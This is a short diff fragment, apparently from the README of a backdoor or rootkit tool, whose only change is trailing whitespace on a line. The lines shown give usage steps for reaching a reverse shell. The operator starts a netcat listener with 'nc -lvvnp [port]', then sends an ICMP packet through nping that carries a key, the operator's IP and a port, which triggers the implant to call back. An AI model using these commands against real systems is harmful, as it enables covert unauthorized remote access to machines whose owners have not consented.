@@ -10,6 +10,6 @@ make
 ./cleanup.sh
 
 ##to connect to reverse shell:
-on your machine: nc -lvvnp [port]
+on your machine: nc -lvvnp [port]  
 sudo nping --icmp -c 1 -dest-ip [destination ip] --data-string '[KEY] [your ip] [port]'
 
